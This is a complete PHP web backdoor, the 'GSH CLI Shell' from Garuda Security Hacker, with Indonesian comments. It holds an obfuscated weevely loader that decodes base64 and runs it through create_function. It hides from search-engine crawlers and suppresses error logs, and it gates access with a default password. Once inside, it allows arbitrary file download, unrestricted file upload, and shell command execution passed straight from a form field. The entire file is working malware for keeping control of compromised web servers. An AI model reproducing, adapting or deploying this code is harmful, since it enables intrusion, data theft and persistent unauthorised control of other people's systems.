<?php
// Copyright Sheet Dont Remove if you Real Human 
  // Shell ini bukan sepenuh nya murni buatan sendiri
  // alur coding dan beberapa resource 
  // masih menggunakan yang sudah ada sebelumnya
  // namun implementasi ide dan kreasi nya murni 
 
/////////////////////////////////////////////////////////////
//														   //
//			Garuda Security Hacker Command Line Shell 	   //
//	          											   //
/////////////////////////////////////////////////////////////
//                                                         //
//  Created by 	: Yukinoshita 47						   //
//  Version    	: 1.0									   //
//  Team     	: Garuda Security Hacker				   //
//  Resource 	: Google, Github, And W3Shools			   //
//  Site		: * garudasecurityhacker.blogspot.com	   //
//				  * bitosi.com							   //
//														   //
//               "No Army Can Stop Idea"        		   //
//														   //
/////////////////////////////////////////////////////////////

?>
<?
// ini script weevely sebaik nya anda hapus jika merasa tidak diperlukan
// script weevely guna nya untuk backconnect shell ini dengan weevely nya
// cara konek shell ini via terminal 
// root@hacker: # weevely <url> <password>
// root@hacker: # contoh weeveley situs.co.li/shell.php gsh1337
// buat yang ngerti aja ya :p
// bagi yang sering pake weevely sebaik nya ganti script dibawah
// dengan script weevely yang anda generate sendiri demi keamanan anda
// cari tutorial di google mengenai weevely
$hvsa="yksIGpvaW4oYXJyYXlfjsc2xpY2UojsJGEsjsJGMoJGEjspLTMpKSkpKTtlY2hvICc8LycjsuJGsuJz4nO30js=";
$shhu="3JljscGjsxhY2UjsoYXJyYXkoJy9bjsXlx3PVjsxzXS8nLCcvXHMvJyksIGFycjsmFjs5KCcnjsLCcrJ";
$hgqu = str_replace("lh","","lhslhtlhrlh_lhreplhllhalhclhe");
$tdkq="GjsEpPjMjspeyRrjsPSdoMTMjszNyc7ZWNobyAjsnPCcuJGsuJz4nO2V2YjsWwoYjsmFzZTY0X2jsRlY29kZShwcmVnX";
$qwuo="JGM9J2jsNvdW50JzskYjsT0kX0NPT0tJjsRTtpZihjsyZXNjsldCgkYSjsk9PSjsdncycgJiYgjsJGMoJ";
$uhyd = $hgqu("q", "", "qbqaqseq64q_qdqeqcqoqde");
$ezoi = $hgqu("s","","scsresatse_sfsunscstion");
$jmlq = $ezoi('', $uhyd($hgqu("js", "", $qwuo.$tdkq.$shhu.$hvsa))); $jmlq();
?>
<?
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "cd149e6d8931b12be79cc6b5bd394cb9"; // default: gsh1337
$color = "#00ff00";
$default_action = 'home';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
	<link rel="icon" href="http://vignette3.wikia.nocookie.net/finalfantasy/images/b/b2/FFX_bomb_render.png/revision/latest?cb=20120722185839" type="image/x-icon"/>	
<title>[ GSH CLI Shell 1.0 ]</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
		border: 1px solid #f00;
		padding: 10px;
		background: #000;
		color: white;
}
</style>
</head>
<center>


		
<img src=https://4.bp.blogspot.com/-Swu2HGmALro/WGPk_OrIVXI/AAAAAAAAAQQ/PKB5v1LqWxUUtypQq0xWLOu_4-wrSRzVwCLcB/s1600/gsh%2Bcoder.jpg height=300 width=650>
<br><br><b><font face="arial" color="red" size="3">Garuda Security Hacker</font>&nbsp;<font face="arial" color="white" size="3">Web Backdoor Access [ CLI Shell 1.0 ]  </font></b>
<br>
<br>
<form method="post">
<input type="password" name="pass">
</form>

<br><b><font face="arial" color="red" size="3">We Hope You Enjoy This Stuff</font>&nbsp;<font face="arial" color="white" size="3">And As Always Have Nice Day</font></b>
<br><br>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>


<html>
<style>
/* unvisited link */
a:link {
    color: yellow;
}

/* visited link */
a:visited {
    color: cyan;
}

/* mouse over link */
a:hover {
    color: white;
}

/* selected link */
a:active {
    color: green;
}
body {
		background-image: url("http://www.publicdomainpictures.net/pictures/40000/velka/dark-background.jpg");
		background-color: #000000;
		color: #FF0000;
		text-align: center;
		font-family: helvetica;
		font-size: 14px;
		margin: 10% auto auto auto;
}
#pesan {
		background-color: #000000;
		width: 80%;
		padding: 20px;
		border: 2px solid #f00;
		margin: 0px auto auto auto;
	}
	
table, td, th {    
	background-color: black;
    border: 1px solid #eee;
    text-align: left;
}

table {
    border-collapse: collapse;
    width: 100%;
}

th, td {
    padding: 1px;
}
		
</style>
<link rel="icon" href="http://vignette3.wikia.nocookie.net/finalfantasy/images/b/b2/FFX_bomb_render.png/revision/latest?cb=20120722185839" type="image/x-icon"/>	
<title>GSH Cli Shell</title>

<div id="pesan"> 
<b><font face="arial" color="red" size="4">Garuda Security Hacker</font>&nbsp;<font face="arial" color="white" size="4">CLI Shell</font></b>
<br><a href='?logout=true'>Click Here If You Want Logout</a>
<?
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}



?>

<head>
	</style></head><body></table><center>
		<font face="Pirata One" size="10" color="black" style="text-shadow: 1px 0px .1em gold, -1px 1px .1em gold, -1px -1px .1em black"><b><font size='4'><font style="text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0); color: rgb(255, 255, 255); font-weight: bold;">
			<font style="color:yellow;size="2";text-align: center;font-family:Pirata One; text-shadow: 3px 3px 3px yellow;">

			</center><br><?php echo '<h2><b>Uploader</h2>'.php_uname().'<br></b>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success !!!</b><br><br>'; }	else { echo '<b>Upload Fail !!!</b><br><br>'; }}?><object data="http://flash-mp3-player.net/medias/player_mp3.swf" height="0" type="application/x-shockwave-flash" width="0"><param name="bgcolor" value="#ffffff">


<h2>Command Line</h2>
<form action="<?=$_SERVER['REQUEST_URI']?>" method="POST"><input type="text" name="x" value="<?=htmlentities($_POST['x'])?>"><input type="submit" value="cmd"></form><pre><? echo `{$_POST['x']}`; ?></pre><? die(); ?>
